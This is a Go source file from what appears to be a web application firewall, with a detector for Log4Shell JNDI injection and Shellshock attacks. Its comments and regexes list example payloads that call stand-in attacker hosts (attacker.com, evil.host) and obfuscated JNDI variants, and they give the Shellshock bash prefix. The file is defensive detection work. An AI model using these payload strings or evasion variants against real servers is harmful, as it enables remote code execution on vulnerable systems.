package semantic

import (
	"context"
	"regexp"
	"strings"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

// Log4ShellDetector detects Log4Shell (CVE-2021-44228) JNDI injection patterns.
//
// Core signatures:
//   - ${jndi:ldap://attacker.com/exploit}
//   - ${jndi:rmi://evil.host/obj}
//   - ${jndi:dns://callback.domain}
//   - Obfuscated variants: ${${::-j}ndi:ldap://...} / ${jndi:${lower:l}dap://...}
//   - Nested lookups: ${${env:ENV_VAR:-j}ndi:ldap://...}
//
// Also covers Shellshock (CVE-2014-6271): () { :;}; /bin/bash -c "..."
type Log4ShellDetector struct{ mode string }

func NewLog4ShellDetector(mode string) *Log4ShellDetector {
	return &Log4ShellDetector{mode: mode}
}

func (d *Log4ShellDetector) ID() string    { return "semantic.log4shell" }
func (d *Log4ShellDetector) Name() string  { return "Log4Shell & Shellshock Detector" }
func (d *Log4ShellDetector) Priority() int { return 340 }

func (d *Log4ShellDetector) Detect(_ context.Context, reqCtx *engine.RequestContext) (*engine.DetectionResult, error) {
	surface := requestText(reqCtx)
	normalized := normalizeLog4Shell(surface)

	// ---- Log4Shell JNDI injection ----
	if rxLog4ShellJNDI.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "log4shell",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Log4Shell JNDI injection detected",
			Confidence: 0.98,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	// ---- Obfuscated Log4Shell variants ----
	if rxLog4ShellObfuscated.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "log4shell",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Obfuscated Log4Shell pattern detected",
			Confidence: 0.96,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	// ---- Shellshock bash injection ----
	if rxShellshock.MatchString(normalized) {
		return &engine.DetectionResult{
			Detected:   true,
			DetectorID: d.ID(),
			Category:   "shellshock",
			Severity:   engine.SeverityCritical,
			Action:     actionForMode(d.mode),
			Message:    "Shellshock bash injection detected",
			Confidence: 0.97,
			Payload:    truncateLog4Shell(surface, 200),
		}, nil
	}

	return nil, nil
}

// analyzeLog4Shell is the semantic analyzer entry point called from analyzer.go.
func analyzeLog4Shell(candidate semanticCandidate) (Hit, bool) {
	normalized := normalizeLog4Shell(candidate.text)

	// Log4Shell JNDI injection
	if rxLog4ShellJNDI.MatchString(normalized) {
		return hit(candidate, "log4shell", engine.SeverityCritical, 0.98, map[string]bool{
			"syntax: Log4j JNDI lookup expression":                                         true,
			"semantics: remote naming service lookup can load attacker-controlled content": true,
		}), true
	}

	// Obfuscated Log4Shell
	if rxLog4ShellObfuscated.MatchString(normalized) {
		return hit(candidate, "log4shell", engine.SeverityCritical, 0.96, map[string]bool{
			"syntax: obfuscated Log4j lookup expression":                                   true,
			"semantics: remote naming service lookup can load attacker-controlled content": true,
		}), true
	}

	// Shellshock
	if rxShellshock.MatchString(normalized) {
		return hit(candidate, "shellshock", engine.SeverityCritical, 0.97, map[string]bool{
			"syntax: Shellshock function-definition prefix":        true,
			"semantics: trailing shell command execution boundary": true,
		}), true
	}

	return Hit{}, false
}

var (
	// Log4Shell JNDI injection: ${jndi:ldap://...} / ${jndi:rmi://...} / ${jndi:dns://...}
	rxLog4ShellJNDI = regexp.MustCompile(`\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nds)://`)
	// Obfuscated variants that survive peel (single ${...} still carrying jndi/ldap and ://).
	rxLog4ShellObfuscated = regexp.MustCompile(`\$\{[^}]*(?:jndi|ldap|rmi|dns)[^}]*://`)
	// Innermost ${...} with no nested brace; peelLog4jLookups walks these outward.
	rxLog4jInnermostLookup = regexp.MustCompile(`\$\{([^{}]+)\}`)
	// Shellshock: () { :;}; <command>
	rxShellshock = regexp.MustCompile(`\(\s*\)\s*\{\s*:;\s*\};`)
)

// normalizeLog4Shell expands character-substitution lookups, then lowercases so
// ${upper:j}ndi and ${::-J}ndi still match the canonical JNDI regex.
func normalizeLog4Shell(text string) string {
	return strings.ToLower(peelLog4jLookups(text))
}

// hasLog4ShellLookup reports a JNDI lookup either in the clear or after peel.
// Used by hint/guess so obfuscated ${${::-j}ndi:...} still reaches analyzeLog4Shell.
func hasLog4ShellLookup(normalized string) bool {
	if log4ShellJNDIToken(normalized) {
		return true
	}
	if !strings.Contains(normalized, "${") {
		return false
	}
	if !strings.Contains(normalized, "::-") &&
		!strings.Contains(normalized, "lower:") &&
		!strings.Contains(normalized, "upper:") &&
		!strings.Contains(normalized, ":-") {
		return false
	}
	return log4ShellJNDIToken(normalizeLog4Shell(normalized))
}

func log4ShellJNDIToken(s string) bool {
	return strings.Contains(s, "${jndi:") ||
		strings.Contains(s, "jndi:ldap://") ||
		strings.Contains(s, "jndi:rmi://") ||
		strings.Contains(s, "jndi:dns://") ||
		strings.Contains(s, "jndi:iiop://") ||
		strings.Contains(s, "jndi:corba://") ||
		strings.Contains(s, "jndi:nds://")
}

// peelLog4jLookups expands character-substitution lookups so a later JNDI match
// sees ${jndi:ldap://...}. ${::-j}, ${lower:j}, and ${env:VAR:-j} become their
// default or mapped value. Lookups without a default, including
// ${sys:java.version} used as a callback host, stay intact. ${jndi:...} itself
// is not expanded.
func peelLog4jLookups(s string) string {
	const maxRounds = 12
	for i := 0; i < maxRounds; i++ {
		next := rxLog4jInnermostLookup.ReplaceAllStringFunc(s, expandLog4jLookup)
		if next == s {
			return s
		}
		s = next
	}
	return s
}

func expandLog4jLookup(match string) string {
	if len(match) < 3 {
		return match
	}
	inner := match[2 : len(match)-1]
	if strings.HasPrefix(inner, "::-") {
		return inner[3:]
	}
	colon := strings.IndexByte(inner, ':')
	if colon <= 0 {
		return match
	}
	prefix := strings.ToLower(inner[:colon])
	rest := inner[colon+1:]
	switch prefix {
	case "lower", "lowercase":
		return strings.ToLower(rest)
	case "upper", "uppercase":
		return strings.ToUpper(rest)
	}
	if i := strings.LastIndex(rest, ":-"); i >= 0 {
		switch prefix {
		case "env", "sys", "java", "main", "ctx", "map", "sd", "marker", "date", "bundle", "log4j":
			return rest[i+2:]
		}
	}
	return match
}

func truncateLog4Shell(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
